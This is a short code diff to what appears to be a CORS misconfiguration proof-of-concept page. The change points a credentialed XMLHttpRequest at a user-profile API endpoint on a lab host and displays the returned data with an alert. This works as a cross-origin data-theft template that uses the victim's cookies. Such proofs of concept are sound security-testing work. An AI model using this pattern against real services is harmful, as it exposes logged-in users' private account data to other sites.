@@ -17,7 +17,8 @@ function cors() {
       document.getElementById("demo").innerHTML = alert(this.responseText);
     }
   };
-  xhttp.open("GET", "https://integration-time.epam.com/api/info", true);
+  xhttp.open("GET", "https://epamplusec.lab.epam.com/api/v1/profile/-671854297", true);
+  xhttp.withCredentials = true;
   xhttp.send();
 }
 </script>
